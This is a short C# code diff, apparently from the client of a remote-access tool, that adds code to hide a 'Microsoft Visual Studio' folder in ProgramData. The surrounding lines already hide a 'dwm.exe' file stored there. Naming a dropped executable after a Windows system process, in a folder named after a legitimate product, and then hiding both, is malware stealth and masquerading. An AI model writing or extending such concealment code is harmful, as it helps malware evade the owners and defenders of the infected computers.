@@ -93,6 +93,13 @@ namespace Client
                         di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                     }
 
+                    DirectoryInfo directory = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio"));
+                    
+                    if ((directory.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
+                    {
+                        directory.Attributes = directory.Attributes | FileAttributes.Hidden;
+                    }
+
                     if(File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe")))
                     {
                         File.SetAttributes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft Visual Studio", "dwm.exe"), FileAttributes.Hidden);
